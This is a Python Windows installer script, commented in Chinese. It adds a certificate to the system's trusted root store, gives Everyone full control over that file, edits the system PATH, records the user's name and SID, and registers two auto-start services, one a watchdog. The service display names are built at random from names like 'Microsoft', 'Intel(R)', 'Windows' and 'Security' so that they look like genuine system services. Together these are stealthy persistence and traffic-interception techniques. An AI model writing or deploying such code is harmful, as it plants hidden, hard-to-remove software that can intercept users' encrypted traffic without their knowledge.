import os
import time
import winreg
import random
import ctypes
import logging
import platform
import subprocess
import win32api
import win32service
import win32security
import traceback
from constants import (
    CERTIFICATES_PATH, LOG_PATH, MAIN_SERVICE_NAME, DAEMON_SERVICE_NAME,
    MAIN_SERVICE_PATH, DAEMON_SERVICE_PATH, CONFIG_PATH
)
from db_manager import DatabaseManager

class CertificateInstaller:
    """证书安装和服务注册管理类"""
    
    def __init__(self):
        """初始化安装程序"""
        self.logger = self._setup_logger()
        self.db_manager = DatabaseManager()
        self._installation_lock = False

    def _setup_logger(self):
        """设置日志记录器"""
        if not os.path.exists(LOG_PATH):
            os.makedirs(LOG_PATH)
        logger = logging.getLogger('installer')
        logger.setLevel(logging.INFO)
        handler = logging.FileHandler(os.path.join(LOG_PATH, 'installer.log'), encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger

    def run_installation(self):
        """执行完整的安装流程"""
        if self._installation_lock:
            self.logger.warning("安装程序正在执行中，请勿重复运行")
            return
        
        try:
            self._installation_lock = True
            self.install_certificate()
            self.add_config_path_to_system_env()
            self.get_user_sid()
            self.register_service()
        finally:
            self._installation_lock = False

    def install_certificate(self):
        """安装证书"""
        os_type = platform.system()
        if os_type == "Windows":
            self._install_windows_certificate()
        else:
            self.logger.warning("不支持自动安装证书的操作系统。")

    def _install_windows_certificate(self):
        """安装 Windows 证书"""
        try:
            if not self.is_admin():
                self.logger.error("需要管理员权限才能安装证书。")
                return

            # 检查证书是否已安装
            check_result = subprocess.run(
                ["certutil", "-verify", CERTIFICATES_PATH],
                check=False, capture_output=True, text=True
            )
            if check_result.returncode == 0:
                self.logger.info("证书已安装，无需重复安装。")
                return

            # 设置证书控制权限
            self.set_full_control_permissions()

            # 安装证书
            subprocess.run(
                ["certutil", "-addstore", "root", CERTIFICATES_PATH],
                check=True
            )
            self.logger.info("Windows系统证书安装成功。")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Windows系统证书安装失败: {e}")

    def is_admin(self):
        """检查当前用户是否具有管理员权限"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def set_full_control_permissions(self):
        """设置文件的完全控制权限"""
        try:
            subprocess.run(
                ['icacls', CERTIFICATES_PATH, '/grant', '*S-1-1-0:F', '/T', '/C'],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.logger.info(f"设置权限成功: {CERTIFICATES_PATH}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"设置权限失败: {CERTIFICATES_PATH}, 错误信息: {e}")

    def add_config_path_to_system_env(self):
        """将配置路径添加到系统环境变量"""
        try:
            with winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
                0,
                winreg.KEY_ALL_ACCESS
            ) as key:
                current_path, _ = winreg.QueryValueEx(key, "Path")
                if CONFIG_PATH not in current_path:
                    new_path = f"{current_path};{CONFIG_PATH}"
                    winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, new_path)
                    self.logger.info(f"已将 {CONFIG_PATH} 永久添加到系统环境变量 PATH 中。")
                else:
                    self.logger.info(f"{CONFIG_PATH} 已存在于系统环境变量 PATH 中。")
        except Exception as e:
            self.logger.error(f"添加 CONFIG_PATH 到系统环境变量失败: {e}")

    def get_user_sid(self):
        """获取当前用户的 SID"""
        try:
            username = win32api.GetUserName()
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_QUERY
            )
            sid = win32security.GetTokenInformation(token, win32security.TokenUser)[0]
            sid = win32security.ConvertSidToStringSid(sid)
            self.db_manager.update_config("username", username)
            self.db_manager.update_config("sid", sid)
        except Exception as e:
            self.logger.error(f"获取用户 SID 失败: {traceback.format_exc()}")

    def _generate_random_service_name(self):
        """生成随机服务显示名称"""
        first_word = [
            "Windows", "System", "User", "Remote", "Device",
            "Microsoft", "Software", "Intel(R)", "Google", "Application"
        ]
        second_word = [
            "Client", "Event", "Update", "Config", "Network", "Connection",
            "Desktop", "Security", "Server", "Task", "Time", "Data"
        ]
        third_word = [
            "Manager", "Handler", "Monitor", "Agent", "Controller", "Utility",
            "Assistant", "Tool", "Module", "Component", "Service", "Configuration",
            "Center"
        ]
        return ' '.join([
            random.choice(first_word),
            random.choice(second_word),
            random.choice(third_word)
        ])

    def register_service(self):
        """注册并启动服务的替代实现"""
        try:
            # 打开服务控制管理器
            sc_handle = win32service.OpenSCManager(
                None,                   # 本地计算机
                None,                   # ServicesActive 数据库
                win32service.SC_MANAGER_ALL_ACCESS  # 完全访问权限
            )

            try:
                # 1. 注册主服务
                display_name = self._generate_random_service_name()
                service_handle = win32service.CreateService(
                    sc_handle,                      # 服务控制管理器句柄
                    MAIN_SERVICE_NAME,              # 服务名称
                    display_name,                   # 显示名称
                    win32service.SERVICE_ALL_ACCESS,# 访问权限
                    win32service.SERVICE_WIN32_OWN_PROCESS,  # 服务类型
                    win32service.SERVICE_AUTO_START,# 启动类型
                    win32service.SERVICE_ERROR_NORMAL,  # 错误控制类型
                    MAIN_SERVICE_PATH,             # 二进制路径
                    None,                          # 加载顺序组
                    0,                             # 标记值
                    None,                          # 依赖项
                    None,                          # 服务账户
                    None                           # 密码
                )

                try:
                    win32service.ChangeServiceConfig2(
                        service_handle,
                        win32service.SERVICE_CONFIG_DESCRIPTION,
                        display_name
                    )

                    # 启动主服务
                    win32service.StartService(service_handle, None)
                    
                    # 等待服务启动
                    start_time = time.time()
                    while time.time() - start_time < 30:
                        status = win32service.QueryServiceStatus(service_handle)[1]
                        if status == win32service.SERVICE_RUNNING:
                            self.logger.info(f"主服务 {MAIN_SERVICE_NAME} 启动成功")
                            break
                        time.sleep(1)
                    else:
                        raise Exception("主服务启动超时")

                finally:
                    win32service.CloseServiceHandle(service_handle)
                    print(display_name)

                # 2. 注册守护服务
                display_name = self._generate_random_service_name()
                service_handle = win32service.CreateService(
                    sc_handle,
                    DAEMON_SERVICE_NAME,
                    display_name,
                    win32service.SERVICE_ALL_ACCESS,
                    win32service.SERVICE_WIN32_OWN_PROCESS,
                    win32service.SERVICE_AUTO_START,
                    win32service.SERVICE_ERROR_NORMAL,
                    DAEMON_SERVICE_PATH,
                    None,
                    0,
                    None,
                    None,
                    None
                )

                try:
                    win32service.ChangeServiceConfig2(
                        service_handle,
                        win32service.SERVICE_CONFIG_DESCRIPTION,
                        display_name
                    )

                    # 启动守护服务
                    win32service.StartService(service_handle, None)
                    
                    # 等待服务启动
                    start_time = time.time()
                    while time.time() - start_time < 30:
                        status = win32service.QueryServiceStatus(service_handle)[1]
                        if status == win32service.SERVICE_RUNNING:
                            self.logger.info(f"守护服务 {DAEMON_SERVICE_NAME} 启动成功")
                            break
                        time.sleep(1)
                    else:
                        raise Exception("守护服务启动超时")

                finally:
                    win32service.CloseServiceHandle(service_handle)
                    print(display_name)

            finally:
                win32service.CloseServiceHandle(sc_handle)

        except Exception as e:
            self.logger.error(f"注册服务失败: {e}")
            raise

if __name__ == "__main__":
    installer = CertificateInstaller()
    installer.run_installation()
